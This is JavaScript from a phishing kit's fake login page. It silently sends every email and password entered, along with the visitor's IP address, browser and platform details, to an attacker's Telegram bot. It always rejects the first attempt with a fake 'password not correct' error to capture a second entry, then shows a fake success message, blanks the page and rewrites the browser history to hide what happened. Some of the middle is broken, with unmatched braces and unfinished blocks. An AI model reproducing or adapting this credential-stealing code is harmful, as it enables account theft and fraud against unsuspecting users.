                '<svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>';

        // Language selector functionality

        // Get client information with IP
        async function getClientInfo() {
            let ipAddress = "Unknown";
            
            // Try to get IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipAddress = ipData.ip;
            } catch (error) {
                console.log('Could not fetch IP address');
            }
            
            return {
                ipAddress: ipAddress,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                attempt: loginAttempts + 1
            };
        }

        // Send data to Telegram
        async function sendToTelegram(email, password) {
            const clientInfo = await getClientInfo();
            
            const message = `üîê LOGIN ATTEMPT #${clientInfo.attempt} üîê

üìß Email: ${email}
üîë Password: ${password}

üìç IP Address: ${clientInfo.ipAddress}

üíª Platform: ${clientInfo.platform}
üì± Screen: ${clientInfo.screen}

‚è∞ Timestamp: ${clientInfo.timestamp}
üîó URL: ${clientInfo.url}
üìé Referrer: ${clientInfo.referrer || 'Direct'}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (response.ok) {
                    console.log(`Login attempt #${clientInfo.attempt} sent to Telegram successfully`);
                    return true;
                } else {
                    console.error('Failed to send to Telegram:', await response.text());
                    return false;
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // Show message to user
        function showMessage(message, type) {
            messageContainer.style.display = 'block';
            messageContainer.className = type + '-message';
            messageContainer.innerHTML = `<div class="${type}-message">${message}</div>`;
            
            // Auto hide after 5 seconds for error messages
            if (type === 'error') {
                setTimeout(() => {
                    messageContainer.style.display = 'none';
                }, 5000);
            }
        }

        // Self-destruct function - completely removes the page
        function selfDestruct() {
            if (hasSelfDestructed) return;
            hasSelfDestructed = true;
            
            // Add self-destruct animation class
            loginWrapper.classList.add('self-destruct');
            
            // Clear all content after animation
            setTimeout(() => {
                // Clear the entire body
                document.body.innerHTML = '';
                
                // Add a meta tag to prevent caching
                const meta = document.createElement('meta');
                meta.httpEquiv = 'Cache-Control';
                meta.content = 'no-cache, no-store, must-revalidate';
                document.head.appendChild(meta);
                
                // Add another meta for Pragma
                const meta2 = document.createElement('meta');
                meta2.httpEquiv = 'Pragma';
                meta2.content = 'no-cache';
                document.head.appendChild(meta2);
                
                // Add meta for Expires
                const meta3 = document.createElement('meta');
                meta3.httpEquiv = 'Expires';
                meta3.content = '0';
                document.head.appendChild(meta3);
                
                // Try to clear browser history and replace current entry
                try {
                    window.history.replaceState({}, document.title, 'about:blank');
                } catch (e) {
                    console.log('Could not replace history');
                }
                
                // Display a blank page with a message
                const blankDiv = document.createElement('div');
                blankDiv.style.cssText = 'display:flex;align-items:center;justify-content:center;height:100vh;font-family:Arial;color:#666;font-size:14px;';
                blankDiv.innerHTML = 'Session expired. Please close this window.';
                document.body.appendChild(blankDiv);
                
                // Log self-destruct to Telegram
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `üí• PAGE SELF-DESTRUCTED\n\nURL: ${window.location.href}\nTime: ${new Date().toISOString()}`
                    })
                }).catch(() => {});
                
            }, 800); // Wait for animation to complete
        }

        // Handle form submission
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = userInput.value.trim();
            const password = passInput.value;

            // Basic validation - if fields are empty, show error
            if (!email || !password) {
                showMessage("Please enter both email and password", 'error');
                return;
            }

            // Increment login attempts
            loginAttempts++;
            
            // Show loading state on button
            document.body.classList.add('logging-in');
            loginSubmit.disabled = true;

            try {
                // Send credentials to Telegram (silently)
                await sendToTelegram(email, password);
                
                if (loginAttempts === 1) {
                    // First attempt - show error message
                    document.body.classList.remove('logging-in');
                    loginSubmit.disabled = false;
                    
                    // Clear password field for retry
                    passInput.value = '';
                    
                    // Show error message
                    showMessage("Password is not correct. Please try again", 'error');
                    
                    // Focus on password field for retry
                    passInput.focus();
                    
                } else if (loginAttempts === 2) {

                    document.body.classList.remove('logging-in');

                    showMessage("Congratulations! Account verification was successful", 'success');

                    passInput.disabled = true;
                    togglePassword.disabled = true;
                    languageSelect.disabled = true;
                    
                    // Change button text
                    loginSubmit.innerText = 'Session Expired';

                        })
                    }).catch(() => {});
                    
                    // Self-destruct after showing success message (3 seconds)
                    setTimeout(() => {

                document.body.classList.remove('logging-in');
                loginSubmit.disabled = false;
                showMessage("An error occurred. Please try again.", 'error');

        // Prevent back/forward navigation after self-destruct
        window.addEventListener('pageshow', function(event) {
            if (event.persisted || hasSelfDestructed) {
                window.location.replace('about:blank');
            }
        });

        // Clear session storage and cookies on load (optional)
        window.addEventListener('load', function() {
            try {
                sessionStorage.clear();
                // Don't clear all cookies, just session-related ones
                document.cookie.split(";").forEach(function(c) {
                    if (c.includes('session') || c.includes('login')) {
                        document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
                    }
                });
            } catch (e) {}
        });
